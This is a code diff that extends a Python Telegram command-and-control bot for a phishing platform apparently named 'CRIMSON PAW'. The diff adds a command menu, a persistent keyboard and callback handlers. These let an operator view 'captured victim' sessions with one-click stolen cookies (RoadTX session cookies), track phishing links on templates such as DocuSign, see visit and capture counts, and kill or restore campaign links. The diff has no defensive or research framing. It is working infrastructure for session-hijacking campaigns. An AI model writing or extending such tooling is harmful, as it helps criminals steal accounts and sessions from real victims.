@@ -38,6 +38,42 @@ class TelegramC2BotThread(threading.Thread):
         self.poll_interval = poll_interval
         self.last_update_id = 0
         self.running = True
+        self.commands_registered = False
+
+    def _register_bot_commands(self, bot_token):
+        """Register slash commands in Telegram so the native [ Menu ] button appears in chat."""
+        try:
+            commands = [
+                {'command': 'menu', 'description': '🎛️ Interactive Command Center'},
+                {'command': 'status', 'description': '📊 Server Health, Tokens & Shield'},
+                {'command': 'sessions', 'description': '📋 Captured Victims with 1-Click Cookies'},
+                {'command': 'links', 'description': '🔗 Deployed Links & Kill Switch'},
+                {'command': 'stats', 'description': '📈 Campaign Conversions & Interceptions'},
+                {'command': 'help', 'description': '❓ Command Manual & Usage Guide'}
+            ]
+            payload = json.dumps({'commands': commands}).encode('utf-8')
+            req = urllib.request.Request(
+                f"https://api.telegram.org/bot{bot_token}/setMyCommands",
+                data=payload,
+                headers={'Content-Type': 'application/json'}
+            )
+            with urllib.request.urlopen(req, timeout=10) as res:
+                if res.status == 200:
+                    logger.info("[TELEGRAM-C2] Native Telegram bot [ Menu ] commands successfully registered.")
+        except Exception as e:
+            logger.warning(f"[TELEGRAM-C2] Could not register bot commands: {e}")
+
+    def _get_persistent_keyboard(self):
+        """Returns the persistent 2x3 quick-action button keyboard docked at screen bottom."""
+        return {
+            'keyboard': [
+                [{'text': '📊 Status'}, {'text': '📋 Sessions'}],
+                [{'text': '🔗 Active Links'}, {'text': '📈 Stats'}],
+                [{'text': '🎛️ Command Menu'}, {'text': '❓ Help'}]
+            ],
+            'resize_keyboard': True,
+            'is_persistent': True
+        }
 
     def run(self):
         logger.info("[TELEGRAM-C2] Interactive Command & Control bot thread started.")
@@ -50,6 +86,10 @@ class TelegramC2BotThread(threading.Thread):
                 if not bot_token or not admin_chat_id:
                     time.sleep(self.poll_interval)
                     continue
+
+                if not self.commands_registered and bot_token:
+                    self._register_bot_commands(bot_token)
+                    self.commands_registered = True
 
                 # Long poll updates from Telegram
                 updates = self._fetch_updates(bot_token)
@@ -68,7 +108,7 @@ class TelegramC2BotThread(threading.Thread):
                             continue
 
                         text = msg.get('text', '').strip()
-                        if text.startswith('/'):
+                        if text:
                             self._handle_command(bot_token, sender_chat_id, text)
 
                     # Handle interactive button clicks (Callback Queries)
@@ -109,8 +149,10 @@ class TelegramC2BotThread(threading.Thread):
                 'parse_mode': 'HTML',
                 'disable_web_page_preview': True
             }
-            if reply_markup:
+            if reply_markup is not None:
                 data['reply_markup'] = reply_markup
+            else:
+                data['reply_markup'] = self._get_persistent_keyboard()
             payload = json.dumps(data).encode('utf-8')
             req = urllib.request.Request(
                 f"https://api.telegram.org/bot{bot_token}/sendMessage",
@@ -175,12 +217,38 @@ class TelegramC2BotThread(threading.Thread):
     # Command Dispatcher
     # ═══════════════════════════════════════════════════════════════════════
     def _handle_command(self, bot_token, chat_id, full_cmd):
+        cmd_clean = full_cmd.strip().lower()
+
+        # Map persistent bottom keyboard button labels to slash commands
+        btn_map = {
+            '📊 status': '/status',
+            'status': '/status',
+            '📋 sessions': '/sessions',
+            'sessions': '/sessions',
+            '🔗 active links': '/links',
+            'links': '/links',
+            '📈 stats': '/stats',
+            'stats': '/stats',
+            '🎛️ command menu': '/menu',
+            'menu': '/menu',
+            '❓ help': '/help',
+            'help': '/help',
+            'start': '/start'
+        }
+
+        if cmd_clean in btn_map:
+            full_cmd = btn_map[cmd_clean]
+
         parts = full_cmd.split()
+        if not parts:
+            return
         cmd = parts[0].lower()
         args = parts[1:]
 
         if cmd in ('/start', '/help'):
             self._cmd_help(bot_token, chat_id)
+        elif cmd == '/menu':
+            self._cmd_menu(bot_token, chat_id)
         elif cmd == '/status':
             self._cmd_status(bot_token, chat_id)
         elif cmd == '/sessions':
@@ -198,12 +266,30 @@ class TelegramC2BotThread(threading.Thread):
         elif cmd == '/stats':
             self._cmd_stats(bot_token, chat_id)
         else:
-            self._send_text(bot_token, chat_id, f"⚠️ Unknown command <code>{cmd}</code>. Type /help to see available commands.")
+            self._send_text(bot_token, chat_id, f"⚠️ Unknown command <code>{cmd}</code>. Tap <b>🎛️ Command Menu</b> below to select an action.")
 
     def _handle_callback(self, bot_token, chat_id, cb_id, data):
         if not data:
             return
-        if data.startswith('ck:'):
+        if data == 'menu_status':
+            self._answer_callback(bot_token, cb_id, 'Fetching platform telemetry...')
+            self._cmd_status(bot_token, chat_id)
+        elif data == 'menu_sessions':
+            self._answer_callback(bot_token, cb_id, 'Loading captured sessions...')
+            self._cmd_sessions(bot_token, chat_id)
+        elif data == 'menu_links':
+            self._answer_callback(bot_token, cb_id, 'Loading campaign links...')
+            self._cmd_links(bot_token, chat_id)
+        elif data == 'menu_stats':
+            self._answer_callback(bot_token, cb_id, 'Computing campaign stats...')
+            self._cmd_stats(bot_token, chat_id)
+        elif data == 'menu_help':
+            self._answer_callback(bot_token, cb_id, 'Loading manual...')
+            self._cmd_help(bot_token, chat_id)
+        elif data == 'menu_main':
+            self._answer_callback(bot_token, cb_id, 'Refreshing command deck...')
+            self._cmd_menu(bot_token, chat_id)
+        elif data.startswith('ck:'):
             uc = data.split(':', 1)[1]
             self._answer_callback(bot_token, cb_id, 'Generating RoadTX session cookie...')
             self._cmd_cookie(bot_token, chat_id, [uc])
@@ -214,6 +300,43 @@ class TelegramC2BotThread(threading.Thread):
         elif data == 'refresh_sessions':
             self._answer_callback(bot_token, cb_id, 'Refreshing captured sessions...')
             self._cmd_sessions(bot_token, chat_id)
+        elif data.startswith('kill_link:'):
+            lid = data.split(':', 1)[1]
+            self._answer_callback(bot_token, cb_id, f'Killing link #{lid}...')
+            self._cmd_kill(bot_token, chat_id, [lid])
+        elif data.startswith('restore_link:'):
+            lid = data.split(':', 1)[1]
+            self._answer_callback(bot_token, cb_id, f'Restoring link #{lid}...')
+            self._cmd_restore(bot_token, chat_id, [lid])
+
+    def _cmd_menu(self, bot_token, chat_id):
+        cfg = get_settings()
+        platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+        menu_html = (
+            f"🦅 <b>{platform_name} // INTERACTIVE CONTROL DECK</b>\n"
+            f"<i>Tap any module button below for immediate execution:</i>\n\n"
+            f"• <b>Status:</b> Health, token validity &amp; shield metrics\n"
+            f"• <b>Sessions:</b> Captured victim accounts with 1-click cookies\n"
+            f"• <b>Links:</b> Deployed campaigns with 1-tap kill/restore switch\n"
+            f"• <b>Stats:</b> Conversion rates &amp; traffic telemetry\n"
+        )
+        inline_kb = {
+            'inline_keyboard': [
+                [
+                    {'text': "📊 Platform Status", 'callback_data': "menu_status"},
+                    {'text': "📋 Captured Sessions", 'callback_data': "menu_sessions"}
+                ],
+                [
+                    {'text': "🔗 Deployed Links", 'callback_data': "menu_links"},
+                    {'text': "📈 Campaign Stats", 'callback_data': "menu_stats"}
+                ],
+                [
+                    {'text': "❓ Command Manual", 'callback_data': "menu_help"},
+                    {'text': "🔄 Refresh Deck", 'callback_data': "menu_main"}
+                ]
+            ]
+        }
+        self._send_text(bot_token, chat_id, menu_html, reply_markup=inline_kb)
 
     # ═══════════════════════════════════════════════════════════════════════
     # Command Handlers
@@ -440,20 +563,34 @@ class TelegramC2BotThread(threading.Thread):
             import deployments
             deps = deployments.get_deployments() if hasattr(deployments, 'get_deployments') else []
             if not deps:
-                self._send_text(bot_token, chat_id, "ℹ️ No deployed campaign links found.")
+                self._send_text(bot_token, chat_id, "ℹ️ No deployed campaign links found in database.")
                 return
 
-            lines = ["🔗 <b>ACTIVE CAMPAIGN DEPLOYMENTS:</b>\n"]
-            for d in deps[:8]:
-                st_icon = "🟢" if d.get('status') == 'active' else "🔴"
+            lines = ["🔗 <b>DEPLOYED CAMPAIGN LINKS:</b>\n"]
+            inline_kb = []
+
+            for d in deps[:6]:
+                lid = d.get('id')
+                slug = d.get('slug')
+                status = d.get('status')
+                st_icon = "🟢" if status == 'active' else "🔴"
+                land = d.get('land_name', 'Preland')
+
                 lines.append(
-                    f"{st_icon} <b>Link #{d.get('id')}:</b> /{d.get('slug')}\n"
-                    f"├ Landing: <i>{d.get('land_name', 'DocuSign')}</i>\n"
+                    f"{st_icon} <b>Link #{lid}:</b> <code>/{slug}</code>\n"
+                    f"├ Template: <i>{land}</i>\n"
                     f"├ Visits: <b>{d.get('visits', 0)}</b> | Captures: <b>{d.get('captures', 0)}</b>\n"
-                    f"└ Status: <code>{d.get('status')}</code> (Kill: <code>/kill {d.get('id')}</code>)\n"
+                    f"└ Status: <b>{status}</b>\n"
                 )
 
-            self._send_text(bot_token, chat_id, "\n".join(lines))
+                if status == 'active':
+                    inline_kb.append([{'text': f"🚨 Kill Link #{lid} (/{slug})", 'callback_data': f"kill_link:{lid}"}])
+                else:
+                    inline_kb.append([{'text': f"🟢 Restore Link #{lid} (/{slug})", 'callback_data': f"restore_link:{lid}"}])
+
+            inline_kb.append([{'text': "🔄 Refresh Links", 'callback_data': "menu_links"}])
+
+            self._send_text(bot_token, chat_id, "\n".join(lines), reply_markup={'inline_keyboard': inline_kb})
         except Exception as e:
             self._send_text(bot_token, chat_id, f"⚠️ Error listing links: {e}")
 
